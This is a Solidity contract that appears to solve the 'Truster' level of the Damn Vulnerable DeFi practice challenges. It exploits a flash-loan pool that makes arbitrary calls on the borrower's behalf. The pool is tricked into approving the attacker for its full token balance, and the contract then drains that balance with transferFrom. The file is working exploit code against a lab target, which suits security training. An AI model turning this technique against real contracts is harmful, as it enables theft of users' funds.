// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function damnValuableToken() external returns (IERC20);

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterAttack {
    using Address for address;

    function attack(IPool pool, address receiver) public {
        IERC20 token = pool.damnValuableToken();
        uint256 balance = token.balanceOf(address(pool));
        bytes memory payload = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            balance
        );
        pool.flashLoan(0, address(this), address(token), payload);
        token.transferFrom(address(pool), receiver, balance);
    }
}
